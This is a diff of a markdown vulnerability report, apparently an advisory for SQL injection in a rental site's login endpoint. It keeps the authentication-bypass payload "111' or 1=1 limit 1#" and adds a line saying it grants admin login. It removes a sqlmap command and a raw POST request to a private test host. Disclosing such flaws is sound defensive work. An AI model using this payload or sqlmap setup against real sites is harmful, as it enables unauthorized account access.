@@ -62,41 +62,12 @@
 
 - 111' or 1=1 limit 1#
 
+![T6 Y9 @MLOIKH6~L%L){XX0](https://github.com/yezzzo/y3/assets/75334106/033146ea-3a72-4d15-9351-3373e4a4c050)
+
+Enter the payload in the account and enter the password at will. Click Login and we can find that we are logged in to the website and we are the admin account (because the first row in the database is admin)
 
 
-We can see that the page response time is 5s，there is time-based blind.
-
-![image-20240616174420199](https://github.com/yezzzo/y3/assets/75334106/b85e33a8-d176-4216-a320-e8db0796dac5)
-
-The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
-
-```bash
-sqlmap -r source.txt -p username,password --dbs --batch
-```
-
-The content of source.txt:
-
-```bash
-POST /rental/ajax.php?action=login HTTP/1.1
-Host: 192.168.20.156
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
-Accept: */*
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-X-Requested-With: XMLHttpRequest
-Content-Length: 28
-Origin: http://192.168.20.156
-Connection: close
-Referer: http://192.168.20.156/rental/login.php
-Cookie: PHPSESSID=ovnjt8tf7so1vsv86582r6ee7v
-Priority: u=1
-
-username=admin&password=pass
-```
-![image-20240616175247067](https://github.com/yezzzo/y3/assets/75334106/950f80b6-8530-4590-9645-075546f09988)
-
-
+![image](https://github.com/yezzzo/y3/assets/75334106/0c0dd597-f78c-4303-8c32-2c844039592c)
 
 
 ## Suggested repair
